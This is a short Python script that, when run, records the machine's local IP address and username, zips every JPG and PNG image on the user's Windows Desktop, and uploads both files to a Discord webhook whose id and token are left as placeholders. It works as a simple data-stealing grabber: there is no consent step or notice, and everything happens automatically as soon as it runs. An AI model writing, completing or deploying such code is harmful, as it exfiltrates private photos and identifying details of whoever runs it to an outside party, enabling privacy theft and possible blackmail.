import socket
import getpass
import os
import zipfile
import requests

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def zip_pictures():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    pictures = [os.path.join(desktop, f) for f in os.listdir(desktop) if f.endswith(".jpg") or f.endswith(".png") or f.endswith(".jpeg")]
    with zipfile.ZipFile('Desktop_pictures.zip', 'w') as zip:
        for picture in pictures:
            zip.write(picture)
    print("Pictures zipped successfully!")


def log_ip():
    ip = get_ip()
    username = getpass.getuser()
    with open("ip_log.txt", "a") as f:
        f.write(username + " " + ip + "\n")
    print("IP address and username logged:",username, ip)

def send_to_webhook(webhook_url, file_paths):
    for file_path in file_paths:
        with open(file_path, "rb") as f:
            files = {"file": (file_path, f)}
            requests.post(webhook_url, files=files)
    print("Files sent to webhook successfully")

file_paths = ["ip_log.txt", "Desktop_pictures.zip"]
webhook_url = "https://discordapp.com/api/webhooks/your_webhook_id/your_webhook_token"
log_ip()
zip_pictures()
send_to_webhook(webhook_url, file_paths)
